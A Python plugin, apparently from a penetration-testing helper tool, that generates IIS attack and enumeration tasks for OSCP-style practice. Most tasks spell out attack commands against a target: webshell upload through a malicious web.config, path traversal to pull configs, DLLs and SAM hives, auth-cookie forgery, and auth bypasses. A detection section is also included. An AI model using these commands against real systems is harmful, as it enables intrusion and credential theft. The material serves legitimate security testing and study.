"""
IIS (Internet Information Services) enumeration plugin

Generates tasks for IIS web server enumeration including:
- Internal IP disclosure via HTTP/1.0
- web.config upload and execution
- IIS-specific directory brute-force
- Path traversal and source code disclosure
- ASP.NET configuration decryption
- Trace.axd debugging exposure
- Shortname enumeration (tilde vulnerability)
- Authentication bypass techniques
- Fileless backdoor detection

Extracted from HackTricks: pentesting-web/iis-internet-information-services.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class IISPlugin(ServicePlugin):
    """IIS web server enumeration plugin"""

    @property
    def name(self) -> str:
        return "iis"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'https-alt']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect IIS web servers"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        extrainfo = port_info.get('extrainfo', '').lower()
        port = port_info.get('port')

        # Check for IIS indicators
        if 'iis' in product or 'iis' in version or 'iis' in extrainfo:
            return True

        # Check for Microsoft-IIS in service
        if 'microsoft-iis' in service:
            return True

        # Check for ASP.NET indicators
        if 'asp.net' in product or 'aspx' in extrainfo:
            return True

        # Check common IIS ports (fallback if service is HTTP/HTTPS)
        if any(svc in service for svc in self.service_names):
            # Additional checks for IIS-specific indicators
            if 'microsoft' in product or 'windows' in extrainfo:
                return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate IIS enumeration task tree"""
        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'IIS')
        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        base_url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'iis-enum-{port}',
            'name': f'IIS Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Internal IP Disclosure (QUICK_WIN)
        tasks['children'].append({
            'id': f'iis-internal-ip-{port}',
            'name': 'Internal IP Disclosure (HTTP/1.0)',
            'type': 'command',
            'metadata': {
                'command': f'nc -v {target} {port}',
                'description': 'Strip Host header with HTTP/1.0 to leak internal IP in Location header (302 redirects)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'RECON'],
                'flag_explanations': {
                    '-v': 'Verbose output showing connection details',
                    'nc': 'Netcat - manual HTTP interaction'
                },
                'success_indicators': [
                    'Location header shows internal IP (192.168.x.x, 10.x.x.x)',
                    'X-FEServer header reveals internal hostname',
                    'Server: Microsoft-IIS/X.X banner visible'
                ],
                'failure_indicators': [
                    'No 302 redirect response',
                    'Location header uses external IP/domain',
                    'Connection refused or timeout'
                ],
                'next_steps': [
                    'Send: GET / HTTP/1.0 (press Enter twice)',
                    'Examine Location header for internal network ranges',
                    'Try different endpoints that trigger redirects (/admin, /owa, /autodiscover)',
                    'Document internal IPs for pivoting'
                ],
                'alternatives': [
                    f'openssl s_client -connect {target}:{port} (for HTTPS)' if is_https else 'curl -i -0 http://{target}:{port}/',
                    f'telnet {target} {port}',
                    'Burp Suite: Send GET / HTTP/1.0 with no Host header'
                ],
                'notes': 'Common on Exchange, SharePoint, OWA deployments. Internal IPs aid network mapping.',
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 2: Trace.axd Debugging Exposure (QUICK_WIN)
        tasks['children'].append({
            'id': f'iis-trace-axd-{port}',
            'name': 'ASP.NET Trace.axd Debugging Check',
            'type': 'command',
            'metadata': {
                'command': f'curl -i {base_url}/trace.axd',
                'description': 'Check for enabled ASP.NET debugging (exposes session IDs, cookies, credentials, source paths)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    '-i': 'Include HTTP headers in output',
                    'curl': 'HTTP client for quick GET requests',
                    '/trace.axd': 'ASP.NET debugging endpoint'
                },
                'success_indicators': [
                    'HTTP 200 status with "Application Trace" in response',
                    'Table showing request history with cookies/sessions',
                    'Source code paths visible (C:\\inetpub\\wwwroot\\...)',
                    'Credentials or sensitive data in request logs'
                ],
                'failure_indicators': [
                    'HTTP 404 - endpoint not found',
                    'HTTP 403 - disabled or restricted',
                    'No sensitive data in trace logs'
                ],
                'next_steps': [
                    'Harvest session IDs from trace logs',
                    'Extract credentials from POST request bodies',
                    'Map physical file paths for path traversal targets',
                    'Identify authentication cookies (ASPXAUTH, .ASPXAUTH)',
                    'Document findings for report: /trace.axd enabled = critical misconfiguration'
                ],
                'alternatives': [
                    f'Browser: Navigate to {base_url}/trace.axd',
                    f'wget {base_url}/trace.axd -O trace.html',
                    'Burp Suite: Browse /trace.axd and analyze responses'
                ],
                'notes': 'Rapid7 advisory: https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/',
                'estimated_time': '1-2 minutes'
            }
        })

        # Task 3: IIS Shortname Enumeration (Tilde Vulnerability)
        tasks['children'].append({
            'id': f'iis-shortname-scan-{port}',
            'name': 'IIS Shortname Enumeration (Tilde ~)',
            'type': 'command',
            'metadata': {
                'command': f'java -jar /usr/share/iis-shortname-scanner/iis_shortname_scanner.jar 2 20 {base_url}/',
                'description': 'Enumerate 8.3 short filenames (finds first 6 chars of files/folders, bypasses auth)',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'AUTOMATED'],
                'flag_explanations': {
                    '2': 'Threads (2 for stability)',
                    '20': 'Timeout in seconds',
                    'iis_shortname_scanner.jar': 'IIS tilde vulnerability scanner'
                },
                'success_indicators': [
                    'Files/folders discovered (e.g., ADMIN~1, CONFIG~1)',
                    'Status differentials confirm vulnerability',
                    'Works even behind Basic Authentication'
                ],
                'failure_indicators': [
                    'No status code differences (server patched)',
                    'All requests return same response',
                    'IIS version >= 10 (often patched)'
                ],
                'next_steps': [
                    'Use LLM/brainstorming script to expand shortnames to full names',
                    'Test discovered files: curl {base_url}/ADMIN~1 variations',
                    'Combine with directory brute-force for complete names',
                    'Script: https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py'
                ],
                'alternatives': [
                    f'Manual: curl -i {base_url}/\\*~1*/.aspx',
                    f'msfconsole: use scanner/http/iis_shortname_scanner; set RHOSTS {target}; set RPORT {port}; run',
                    'Custom script: Iterate A-Z0-9 with ~1, ~2 variations'
                ],
                'notes': 'Install: git clone https://github.com/irsdl/IIS-ShortName-Scanner; Research: https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 4: IIS-Specific Directory Brute-force
        tasks['children'].append({
            'id': f'iis-dir-bruteforce-{port}',
            'name': 'IIS-Specific Directory Brute-force',
            'type': 'command',
            'metadata': {
                'command': f'gobuster dir -u {base_url} -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -o iis_gobuster_{port}.txt',
                'description': 'Brute-force IIS-specific paths (.aspx, .config, /aspnet_client, etc.)',
                'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                'flag_explanations': {
                    'dir': 'Directory/file brute-forcing mode',
                    '-u': 'Target URL',
                    '-w': 'IIS-specific wordlist (includes extensions)',
                    '-o': 'Output file (required for OSCP documentation)'
                },
                'success_indicators': [
                    'Status 200/301/302 for .aspx, .config files',
                    '/aspnet_client directory found',
                    'web.config accessible (HTTP 200)',
                    'Upload endpoints discovered (.aspx forms)'
                ],
                'failure_indicators': [
                    'All requests return 404',
                    'Rate limiting or WAF blocking',
                    'Only default IIS pages found'
                ],
                'next_steps': [
                    'Test found .config files for upload: curl -X POST {base_url}/found.config',
                    'Check /aspnet_client for version info and exploits',
                    'Download web.config if accessible: curl {base_url}/web.config',
                    'Test upload forms with malicious .config files'
                ],
                'alternatives': [
                    f'ffuf -u {base_url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt',
                    f'wfuzz -u {base_url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404',
                    'Manual: Test common IIS paths (/admin, /upload, /backup, /app_data)'
                ],
                'notes': 'Wordlist sources: HackTricks iisfinal.txt (SecLists IIS.fuzz.txt + aspx/asp lists). Test without adding extensions - list includes them.',
                'estimated_time': '10-15 minutes'
            }
        })

        # Task 5: web.config Upload Attack
        web_config_tasks = {
            'id': f'iis-webconfig-upload-{port}',
            'name': 'web.config Upload and Execution',
            'type': 'parent',
            'children': [
                {
                    'id': f'iis-webconfig-recon-{port}',
                    'name': 'Identify Upload Endpoints',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find upload functionality that may accept .config files',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RECON'],
                        'success_indicators': [
                            'File upload form discovered',
                            'Upload accepts .config files',
                            'No file type validation visible'
                        ],
                        'next_steps': [
                            'Test upload with benign .config file',
                            'Check if uploaded files are in web-accessible directory',
                            'Download malicious web.config template: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config'
                        ],
                        'alternatives': [
                            'Search gobuster results for /upload, /fileupload, /admin/upload',
                            'Spider site for upload forms: burpsuite, zaproxy',
                            'Test PUT method: curl -X PUT {base_url}/test.config -d @web.config'
                        ],
                        'notes': 'web.config files execute code when accessed. Place payload at EOF inside HTML comment.'
                    }
                },
                {
                    'id': f'iis-webconfig-craft-{port}',
                    'name': 'Craft Malicious web.config',
                    'type': 'command',
                    'metadata': {
                        'command': 'wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config -O evil.config',
                        'description': 'Download RCE web.config template (executes ASP.NET code)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                        'flag_explanations': {
                            'wget': 'Download file from URL',
                            '-O': 'Output filename (evil.config)'
                        },
                        'success_indicators': [
                            'File downloaded successfully',
                            'Contains <% %> ASP.NET code blocks',
                            'Payload at end of file inside <!-- --> comment'
                        ],
                        'next_steps': [
                            'Customize payload: cmd.exe commands, reverse shell, webshell',
                            'Test upload: curl -F "file=@evil.config" {base_url}/upload.aspx',
                            'Access uploaded file: curl {base_url}/uploads/evil.config',
                            'Verify code execution via response'
                        ],
                        'alternatives': [
                            'Manual: Create web.config with <handlers> section executing script',
                            'PayloadAllTheThings: Multiple web.config RCE techniques',
                            'Reference: https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/'
                        ],
                        'notes': 'Original research: Soroush Dalili. Payload executes when .config file is accessed directly.'
                    }
                },
                {
                    'id': f'iis-webconfig-execute-{port}',
                    'name': 'Upload and Execute web.config',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Upload malicious web.config and trigger execution',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Upload successful (HTTP 200)',
                            'Accessing uploaded .config returns command output',
                            'Shell received or webshell responds'
                        ],
                        'failure_indicators': [
                            'Upload blocked by file type filter',
                            'Uploaded file not web-accessible',
                            'ASP.NET execution disabled',
                            'HTTP 500 error on access'
                        ],
                        'next_steps': [
                            'If successful: Upgrade to full reverse shell',
                            'Use webshell for enumeration: whoami, ipconfig, dir C:\\',
                            'Document exploit chain for writeup',
                            'If failed: Try other extensions (.asp, .aspx, .cer, .asa)'
                        ],
                        'alternatives': [
                            'Try renaming: evil.config.jpg → evil.config via rename',
                            'Double extension: evil.config.jpg',
                            'Case variation: eViL.CoNfIg',
                            'Content-Type manipulation in upload request'
                        ]
                    }
                }
            ]
        }
        tasks['children'].append(web_config_tasks)

        # Task 6: Path Traversal and Source Code Disclosure
        path_traversal_tasks = {
            'id': f'iis-path-traversal-{port}',
            'name': 'Path Traversal and Source Code Disclosure',
            'type': 'parent',
            'children': [
                {
                    'id': f'iis-traversal-webconfig-{port}',
                    'name': 'Download web.config via Path Traversal',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -i "{base_url}/download.aspx?file=..%2f..%2fweb.config" -o webconfig.xml',
                        'description': 'Exploit path traversal to download web.config (reveals DB creds, keys, assembly versions)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            '..%2f..%2f': 'URL-encoded ../ (directory traversal)',
                            '-i': 'Include headers to verify success',
                            '-o': 'Save output to file for analysis'
                        },
                        'success_indicators': [
                            'HTTP 200 with XML content',
                            '<configuration> XML structure visible',
                            'connectionStrings, appSettings sections present',
                            'assemblyIdentity reveals DLL paths'
                        ],
                        'failure_indicators': [
                            'HTTP 404 - path traversal blocked',
                            'HTTP 403 - access denied',
                            'Empty response or error page',
                            'Input validation blocks ../ sequences'
                        ],
                        'next_steps': [
                            'Parse connectionStrings for DB credentials',
                            'Extract validationKey/decryptionKey for ASPXAUTH cookie attacks',
                            'Map assemblyIdentity to DLL paths: /bin/WebGrease.dll, /bin/AppName.dll',
                            'Download /global.asax: curl "{base_url}/download?file=..%2f..%2fglobal.asax"',
                            'Download /connectionstrings.config if referenced'
                        ],
                        'alternatives': [
                            f'Try different encodings: ..%5c..%5c (backslash), ....//....// (double slash)',
                            'Burp Suite: Intruder with path traversal payloads',
                            'Manual: Test all parameters accepting file paths (?id, ?page, ?file, ?document)',
                            'Tool: dotdotpwn -m http -h {target} -x {port}'
                        ],
                        'notes': 'Reference: https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html'
                    }
                },
                {
                    'id': f'iis-traversal-dlls-{port}',
                    'name': 'Download Application DLLs',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -i "{base_url}/download.aspx?file=..%2f..%2fbin/AppName.dll" -o AppName.dll',
                        'description': 'Download application DLLs for reverse engineering (find hardcoded creds, API keys, logic flaws)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RESEARCH'],
                        'flag_explanations': {
                            '/bin/AppName.dll': 'Common path for custom application assemblies',
                            'AppName.dll': 'Replace with actual assembly name from web.config'
                        },
                        'success_indicators': [
                            'Binary file downloaded (PE executable)',
                            'File signature: MZ header (PE) or .NET assembly',
                            'DLL decompiles successfully'
                        ],
                        'failure_indicators': [
                            'HTTP 404 - DLL not found or wrong path',
                            'Download blocked by server config',
                            'Corrupted/incomplete file'
                        ],
                        'next_steps': [
                            'Decompile .NET DLL: dnSpy, ILSpy, dotPeek',
                            'Search decompiled code for: passwords, API keys, SQL queries, hidden endpoints',
                            'Identify new namespaces and download additional web.configs: /AreaName/Views/web.config',
                            'Map complete application structure for comprehensive attack surface'
                        ],
                        'alternatives': [
                            'Recursive download script to fetch all DLLs from /bin/',
                            'Download common DLLs: System.Web.Mvc.dll, EntityFramework.dll, Newtonsoft.Json.dll',
                            'If path traversal fails: Check for .git exposure, backup files (.bak, .old)'
                        ],
                        'notes': 'Chain: web.config → assembly list → download DLLs → decompile → find new namespaces → download more configs → repeat'
                    }
                },
                {
                    'id': f'iis-traversal-common-files-{port}',
                    'name': 'Download Common Sensitive Files',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Attempt to download common sensitive Windows/IIS files via path traversal',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'success_indicators': [
                            'SAM/SYSTEM hives downloaded (C:\\Windows\\repair\\SAM)',
                            'Unattend.xml with cleartext passwords',
                            'Database connection strings in app configs',
                            'Log files with sensitive data'
                        ],
                        'next_steps': [
                            'Test common paths from HackTricks list (405 lines)',
                            'Priority targets:',
                            '  - C:\\inetpub\\wwwroot\\web.config',
                            '  - C:\\Windows\\Panther\\Unattend.xml (admin passwords)',
                            '  - C:\\Windows\\repair\\SAM, SYSTEM (hash extraction)',
                            '  - C:\\xampp\\mysql\\bin\\my.ini (DB creds)',
                            '  - C:\\xampp\\security\\webdav.htpasswd',
                            'Extract hashes: samdump2 SYSTEM SAM'
                        ],
                        'alternatives': [
                            'Automate with script: for path in list; do curl ...; done',
                            'Use Burp Intruder with common file list',
                            'Tool: fimap -u "{base_url}/download?file=" (LFI scanner)'
                        ],
                        'notes': 'Full path list in source document lines 121-196. Focus on config files first (.config, .xml, .ini).'
                    }
                }
            ]
        }
        tasks['children'].append(path_traversal_tasks)

        # Task 7: ASP.NET Configuration Decryption
        decrypt_tasks = {
            'id': f'iis-decrypt-config-{port}',
            'name': 'Decrypt ASP.NET Configuration',
            'type': 'parent',
            'children': [
                {
                    'id': f'iis-decrypt-aspnet-regiis-{port}',
                    'name': 'Decrypt web.config with aspnet_regiis',
                    'type': 'command',
                    'metadata': {
                        'command': '%WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_regiis.exe -pdf "connectionStrings" "C:\\inetpub\\wwwroot\\MyApp"',
                        'description': 'Decrypt protected web.config sections (requires filesystem/shell access)',
                        'tags': ['POST_EXPLOIT', 'OSCP:MEDIUM', 'WINDOWS'],
                        'flag_explanations': {
                            '-pdf': 'Decrypt configuration section at physical path',
                            '"connectionStrings"': 'Section to decrypt (also try appSettings, identity)',
                            '"C:\\inetpub\\wwwroot\\MyApp"': 'Physical path to application root'
                        },
                        'success_indicators': [
                            'Section decrypted successfully',
                            'Cleartext credentials visible in web.config',
                            'Database connection strings revealed'
                        ],
                        'failure_indicators': [
                            'Access denied (insufficient privileges)',
                            'Section not encrypted',
                            'Key not accessible to current user'
                        ],
                        'next_steps': [
                            'Also decrypt: -pdf "appSettings"',
                            'Extract DB credentials from connectionStrings',
                            'Test credentials on SQL Server, MySQL',
                            'Check for password reuse on other services'
                        ],
                        'alternatives': [
                            'aspnet_regiis.exe -pd "connectionStrings" -app "/MyApp" (by app path)',
                            'Manual: Search for machineKey in web.config or machine.config',
                            'If RsaProtectedConfigurationProvider: Check HKLM\\SOFTWARE\\Microsoft\\Crypto\\RSA\\MachineKeys'
                        ],
                        'notes': 'Requires local/remote shell with app identity privileges. Common post-exploit task after webshell.'
                    }
                },
                {
                    'id': f'iis-decrypt-dpapi-keys-{port}',
                    'name': 'Extract ASP.NET Core Data Protection Keys',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Locate and extract ASP.NET Core Data Protection key rings for cookie/secret decryption',
                        'tags': ['POST_EXPLOIT', 'OSCP:LOW', 'WINDOWS'],
                        'success_indicators': [
                            'Key ring XML/JSON files found',
                            'Keys readable by current user',
                            'Can instantiate IDataProtector with same purposes'
                        ],
                        'next_steps': [
                            'Search locations:',
                            '  - %PROGRAMDATA%\\Microsoft\\ASP.NET\\DataProtection-Keys',
                            '  - HKLM\\SOFTWARE\\Microsoft\\ASP.NET\\Core\\DataProtection-Keys',
                            '  - App_Data\\keys (app-specific)',
                            'Copy key files to attacker machine',
                            'Use keys to decrypt application secrets offline',
                            'Forge authentication cookies with stolen keys'
                        ],
                        'alternatives': [
                            'dir /s /b C:\\ProgramData\\*.xml | findstr DataProtection',
                            'Get-ChildItem -Recurse -Filter *DataProtection* -ErrorAction SilentlyContinue',
                            'Check app source code for custom key storage paths'
                        ],
                        'notes': 'Key rings enable offline decryption of cookies and application secrets. High value if stored with app files.'
                    }
                }
            ]
        }
        tasks['children'].append(decrypt_tasks)

        # Task 8: ASPXAUTH Cookie Forgery
        tasks['children'].append({
            'id': f'iis-aspxauth-forgery-{port}',
            'name': 'ASPXAUTH Cookie Forgery Attack',
            'type': 'manual',
            'metadata': {
                'description': 'Forge ASPXAUTH cookies using stolen keys from web.config (impersonate users)',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'validationKey and decryptionKey extracted from web.config',
                    'ASPXAUTH cookie format identified',
                    'Forged cookie accepted by application',
                    'Impersonated user authenticated'
                ],
                'failure_indicators': [
                    'Keys not in web.config (using machine.config)',
                    'Cookie validation fails',
                    'Custom authentication implementation',
                    'Additional integrity checks present'
                ],
                'next_steps': [
                    'Extract from web.config: <machineKey validationKey="..." decryptionKey="..." />',
                    'Use tool: https://github.com/depthsecurity/aspnet-ticket-forge',
                    'Craft cookie with target user email/username',
                    'Test on same platform (shared machineKey) or target app',
                    'Writeup reference: https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19'
                ],
                'alternatives': [
                    'If keys default: Search for other apps using same ASP.NET platform',
                    'Register account with target email on sibling app → steal cookie → replay',
                    'Metasploit: auxiliary/admin/http/aspnet_forms_auth_bypass'
                ],
                'notes': 'Attack works if: (1) default machineKey used, (2) email = username, (3) shared keys across apps. OSCP:LOW due to low success rate.'
            }
        })

        # Task 9: Basic Auth Bypass (IIS 7.5)
        tasks['children'].append({
            'id': f'iis-auth-bypass-{port}',
            'name': 'IIS 7.5 Basic Auth Bypass',
            'type': 'command',
            'metadata': {
                'command': f'curl -i {base_url}/admin::$INDEX_ALLOCATION/admin.php',
                'description': 'Bypass Basic Authentication on IIS 7.5 using NTFS stream syntax',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'QUICK_WIN'],
                'flag_explanations': {
                    '::$INDEX_ALLOCATION': 'NTFS alternate data stream (bypasses auth check)',
                    'admin.php': 'Protected resource (replace with actual path)'
                },
                'success_indicators': [
                    'HTTP 200 without authentication prompt',
                    'Protected page content displayed',
                    'No 401 Unauthorized response'
                ],
                'failure_indicators': [
                    'HTTP 401 still required',
                    'HTTP 404 - syntax not recognized',
                    'IIS version > 7.5 (patched)'
                ],
                'next_steps': [
                    'Also try: /admin:$i30:$INDEX_ALLOCATION/admin.php',
                    'Combine with tilde enumeration to find protected folders',
                    'Test all discovered admin/protected paths',
                    'Chain with path traversal for deeper access'
                ],
                'alternatives': [
                    f'curl {base_url}/admin:$i30:$INDEX_ALLOCATION/',
                    'Browser: Navigate to URL with ::$INDEX_ALLOCATION syntax',
                    'Burp Suite: Test all protected endpoints with NTFS stream syntax'
                ],
                'notes': 'Specific to IIS 7.5. Combine with shortname scanner to discover protected paths first.',
                'estimated_time': '3-5 minutes'
            }
        })

        # Task 10: IIS Authentication Bypass CVE-2022-30209
        tasks['children'].append({
            'id': f'iis-cve-2022-30209-{port}',
            'name': 'CVE-2022-30209 Cached Password Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit hash collision in IIS authentication cache to bypass login',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'RESEARCH'],
                'success_indicators': [
                    'IIS version vulnerable (check headers)',
                    'Password hash collision found',
                    'Login successful with collision password',
                    'Access granted without correct password'
                ],
                'failure_indicators': [
                    'IIS version patched (post-2022)',
                    'No valid user session in cache',
                    'Hash collision not found',
                    'Authentication still fails'
                ],
                'next_steps': [
                    'Research: https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html',
                    'Hash function: j = c + (101*j) & 0xffffffff',
                    'Generate collision: test-for-CVE-2022-30209-auth-bypass == ZeeiJT',
                    'Try login after valid user authenticates (cache populated)',
                    'Test collision passwords: curl -u "user:ZeeiJT" {base_url}/protected/'
                ],
                'alternatives': [
                    'Wait for legitimate user login to populate cache',
                    'Brute-force short collision strings',
                    'Use timing attacks to detect cache hits'
                ],
                'notes': 'Requires timing - attack after valid authentication. Low OSCP relevance (rare in exam).'
            }
        })

        # Task 11: Fileless Backdoor Detection (POST_EXPLOIT / Blue Team)
        backdoor_tasks = {
            'id': f'iis-fileless-backdoor-{port}',
            'name': 'IIS Fileless Backdoor Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'iis-aspx-loader-search-{port}',
                    'name': 'Search for ASPX Reflective Loaders',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Hunt for NET-STAR style fileless backdoors (ASPX pages with embedded Base64 DLLs)',
                        'tags': ['POST_EXPLOIT', 'OSCP:LOW', 'BLUETEAM'],
                        'success_indicators': [
                            'Single ASPX file with very long Base64 blobs',
                            'Cookie-heavy POST requests in logs',
                            'Assembly.Load, Gzip, AES references in ASPX',
                            'Delimiter strings like "STAR" in traffic'
                        ],
                        'next_steps': [
                            'Search IIS logs for suspicious ASPX files with large payloads',
                            'Check w3wp.exe for unbacked managed modules (Process Hacker)',
                            'Look for ASPX files with: Assembly.Load, GZipStream, Reflection',
                            'Examine cookies for Base64+Gzip+AES patterns',
                            'Timestomping: Find files with future/mismatched timestamps',
                            'Reference: https://unit42.paloaltonetworks.com/phantom-taurus/'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ChildItem -Recurse *.aspx | Select-String "Assembly.Load"',
                            'Yara rules for NET-STAR indicators',
                            'Process memory dump: Analyze w3wp.exe for malicious assemblies'
                        ],
                        'notes': 'Red team: Avoid for OSCP (forensics). Blue team: Critical for IIS compromise detection. Phantom Taurus/NET-STAR research.'
                    }
                },
                {
                    'id': f'iis-aspx-loader-example-{port}',
                    'name': 'Example: Minimal ASPX Loader Pattern',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Educational: Understand how reflective ASPX loaders work (for detection/hunting)',
                        'tags': ['POST_EXPLOIT', 'OSCP:LOW', 'RESEARCH'],
                        'next_steps': [
                            'ASPX loader components:',
                            '  1. Base64 payload in page or request parameter',
                            '  2. Gzip decompression',
                            '  3. Optional AES-ECB decryption',
                            '  4. Assembly.Load(byte[]) reflective execution',
                            '  5. Invoke entry point (e.g., ServerRun.Run)',
                            'Detection indicators:',
                            '  - Imports: System.Reflection, System.IO.Compression',
                            '  - Methods: Assembly.Load, GetMethod, Invoke',
                            '  - Encoding chains: Base64 → Gzip → AES → Assembly',
                            'OSCP: Skip implementation, focus on detection for writeups'
                        ],
                        'notes': 'Code example in source lines 244-270. Useful for understanding post-exploit persistence, not for exam exploitation.'
                    }
                }
            ]
        }
        tasks['children'].append(backdoor_tasks)

        # Task 12: HTTPAPI 2.0 404 VHost Discovery
        tasks['children'].append({
            'id': f'iis-vhost-discovery-{port}',
            'name': 'VHost Discovery (HTTPAPI 2.0 404)',
            'type': 'manual',
            'metadata': {
                'description': 'If HTTPAPI 2.0 404 error appears, brute-force VHosts to find correct domain',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                'success_indicators': [
                    'HTTPAPI 2.0 404 error visible',
                    'SSL certificate reveals domain/subdomain',
                    'VHost brute-force finds valid hostname',
                    'Access granted with correct Host header'
                ],
                'failure_indicators': [
                    'No HTTPAPI error (normal 404)',
                    'SSL cert has no useful names',
                    'VHost brute-force exhausted',
                    'Server not using VHost-based routing'
                ],
                'next_steps': [
                    'Check SSL certificate: openssl s_client -connect {target}:{port} | grep "subject\\|issuer"',
                    'Extract domain names from cert: CN, SAN fields',
                    'Brute-force VHosts: gobuster vhost -u {base_url} -w subdomains.txt',
                    'Add to /etc/hosts: {target} discovered.domain.com',
                    'Retry access with Host: discovered.domain.com header'
                ],
                'alternatives': [
                    f'ffuf -u {base_url} -H "Host: FUZZ.{target}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
                    'Manual: curl -H "Host: admin.target.com" {base_url}',
                    'DNSdumpster.com: Passive subdomain enumeration'
                ],
                'notes': 'HTTPAPI 2.0 404 means server expecting specific Host header. Check cert first for quick wins.'
            }
        })

        # Task 13: Exploit Research (Conditional)
        if version and version != 'unknown':
            tasks['children'].append({
                'id': f'iis-exploit-research-{port}',
                'name': f'Exploit Research: IIS {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'iis-searchsploit-{port}',
                        'name': f'SearchSploit: IIS {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "IIS {version}"',
                            'description': 'Search ExploitDB for version-specific IIS exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'searchsploit': 'Local ExploitDB search',
                                f'"IIS {version}"': 'Search term with version'
                            },
                            'success_indicators': [
                                'Exploits found matching version',
                                'RCE or privilege escalation exploits available',
                                'Exploit has working PoC'
                            ],
                            'next_steps': [
                                'Read exploit details: searchsploit -x <ID>',
                                'Copy exploit: searchsploit -m <ID>',
                                'Test exploit on target',
                                'Document exploit attempt in writeup'
                            ],
                            'alternatives': [
                                f'Google: "IIS {version} exploit"',
                                f'GitHub search: IIS {version} vulnerability',
                                'CVE databases: cve.mitre.org'
                            ]
                        }
                    },
                    {
                        'id': f'iis-cve-lookup-{port}',
                        'name': f'CVE Lookup: IIS {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'crack cve-lookup "Microsoft IIS {version}"',
                            'description': 'Search CVE databases for known vulnerabilities',
                            'tags': ['RESEARCH', 'OSCP:MEDIUM'],
                            'flag_explanations': {
                                'cve-lookup': 'CRACK Track CVE search command',
                                f'"Microsoft IIS {version}"': 'Search term (product + version)'
                            },
                            'success_indicators': ['CVEs found with CVSS scores'],
                            'failure_indicators': ['No CVEs for this version'],
                            'next_steps': ['Research CVE details', 'Test exploits if available'],
                            'alternatives': ['Google: CVE Microsoft IIS', 'NVD: nvd.nist.gov']
                        }
                    }
                ]
            })

        return tasks
